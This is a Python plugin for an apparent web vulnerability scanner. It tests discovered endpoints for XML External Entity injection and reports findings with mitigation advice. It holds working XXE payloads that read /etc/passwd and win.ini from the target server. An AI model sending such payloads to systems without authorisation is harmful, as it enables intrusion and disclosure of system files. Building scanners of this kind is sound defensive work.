import asyncio
import aiohttp
from typing import Any, List
from urllib.parse import urlparse

from engine.scanners.base import BaseScanner
from engine.scanners.registry import ScannerRegistry
from engine.models.finding import Finding, Severity


@ScannerRegistry.register
class XXEScanner(BaseScanner):
    """
    XML External Entity (XXE) Scanner.
    Injects XML payloads with external entity definition into endpoints that might accept XML.
    Runs in the Attack Phase, utilizing Attack Surface data.
    """
    
    name = "xxe"
    description = "Tests for XML External Entity vulnerabilities on discovered endpoints."
    
    @property
    def display_name(self) -> str:
        return "XXE Scanner"
        
    async def scan(self, target: str, **kwargs: Any) -> List[Finding]:
        findings = []
        attack_surface = kwargs.get("attack_surface", {})
        
        # XXE usually targets endpoints that accept POST/PUT data
        forms = attack_surface.get("forms", [])
        urls_to_scan = attack_surface.get("internal_urls", [])
        
        # We will try injecting into the root target and a few forms
        targets = [target]
        for f in forms:
             action = f.get("action")
             if action:
                 targets.append(action)
                 
        if not forms and urls_to_scan:
            targets.extend(urls_to_scan[:3])
            
        targets = list(set(targets))[:5]
        
        # Standard XXE payload trying to read /etc/passwd or Windows equivalent
        xxe_payload = """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>"""

        xxe_payload_win = """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"> ]>
<foo>&xxe;</foo>"""

        headers = {
            "Content-Type": "application/xml"
        }
        
        if self._progress_callback:
            self.report_progress(5.0, f"Testing {len(targets)} endpoints for XXE")
            
        async with aiohttp.ClientSession() as session:
            for idx, url in enumerate(targets):
                for payload in [xxe_payload, xxe_payload_win]:
                    try:
                        # Send the XML payload via POST
                        async with session.post(url, data=payload, headers=headers, timeout=aiohttp.ClientTimeout(total=10), ssl=False) as response:
                            content = await response.text()
                            
                            # Analyze Response
                            if "root:x:0:0" in content:
                                findings.append(Finding(
                                    title="XML External Entity (XXE) Injection (Linux)",
                                    description="The endpoint parses XML input and allows external entity retrieval, enabling local file reading.",
                                    severity=Severity.HIGH,
                                    location=url,
                                    mitigation="Disable external entity resolution (DTD) in the XML parser configuration.",
                                    evidence="Found '/etc/passwd' contents (root:x:0:0) in the response body when providing an XML payload."
                                ))
                                break # Found one, skip the windows payload for this url
                            elif "[extensions]" in content or "[fonts]" in content:
                                findings.append(Finding(
                                    title="XML External Entity (XXE) Injection (Windows)",
                                    description="The endpoint parses XML input and allows external entity retrieval, enabling local file reading.",
                                    severity=Severity.HIGH,
                                    location=url,
                                    mitigation="Disable external entity resolution (DTD) in the XML parser configuration.",
                                    evidence="Found 'win.ini' contents in the response body when providing an XML payload."
                                ))
                                break
                                
                    except asyncio.TimeoutError:
                        pass
                    except aiohttp.ClientError:
                        pass
                        
                if self._progress_callback:
                    progress = 5.0 + ((idx + 1) / len(targets)) * 95.0
                    self.report_progress(progress, f"Analyzed {idx+1}/{len(targets)} endpoints")
                    
        return findings
